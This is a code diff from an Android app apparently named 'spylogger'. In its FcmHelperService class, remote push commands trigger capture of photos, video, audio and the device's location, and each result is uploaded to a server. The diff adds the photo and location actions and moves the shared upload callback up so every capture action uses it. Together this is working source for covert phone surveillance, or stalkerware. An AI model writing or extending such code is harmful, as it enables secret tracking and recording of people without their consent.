@@ -11,6 +11,7 @@ import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
 import com.gravatasufoca.spylogger.vos.FcmMessageVO;
+import com.gravatasufoca.spylogger.vos.LocalizacaoVO;
 
 import java.io.File;
 import java.sql.SQLException;
@@ -40,6 +41,15 @@ public class FcmHelperService {
     }
 
     public void executar() {
+        TaskComplete callback = new TaskComplete() {
+            @Override
+            public void onFinish(Object object) {
+                if (object != null) {
+                    enviarArquivo((String) object);
+                }
+            }
+        };
+
         switch (fcmMessageVO.getTipoAcao()) {
             case RECUPERAR_ARQUIVO:
                 enviarArquivo(recuperarArquivo());
@@ -48,27 +58,25 @@ public class FcmHelperService {
                 sendArquivoService.enviar(envioArquivoVO);
                 break;
             case OBTER_AUDIO:
-                TaskComplete callback=new TaskComplete() {
-                    @Override
-                    public void onFinish(Object object) {
-                        if(object!=null){
-                            enviarArquivo((String) object);
-                        }
-                    }
-                };
                 servicosHelper.getAudio(context,fcmMessageVO.getDuracao(),callback);
                 break;
             case OBTER_VIDEO:
-                TaskComplete cb=new TaskComplete() {
+                servicosHelper.getVideo(context,fcmMessageVO.getDuracao(),fcmMessageVO.getCameraFrente(),callback);
+                break;
+            case OBTER_FOTO:
+                servicosHelper.getPicture(context,fcmMessageVO.getCameraFrente(),callback);
+                break;
+            case OBTER_LOCALIZACAO:
+                servicosHelper.getLocation(context, new TaskComplete() {
                     @Override
                     public void onFinish(Object object) {
                         if(object!=null){
-                            enviarArquivo((String) object);
+                            LocalizacaoVO localizacaoVO= (LocalizacaoVO) object;
+                            localizacaoVO.setEnvioArquivoVO(envioArquivoVO);
+                            sendArquivoService.enviarLocalizacao(localizacaoVO);
                         }
                     }
-                };
-                servicosHelper.getVideo(context,fcmMessageVO.getDuracao(),fcmMessageVO.getCameraFrente(),cb);
-                break;
+                });
             default:
                 return;
         }
@@ -100,9 +108,7 @@ public class FcmHelperService {
     }
     private void enviarArquivo(String file) {
         if(file!=null){
-            envioArquivoVO.setId(fcmMessageVO.getId());
             envioArquivoVO.setArquivo(file);
-
             sendArquivoService.enviar(envioArquivoVO);
         }
     }
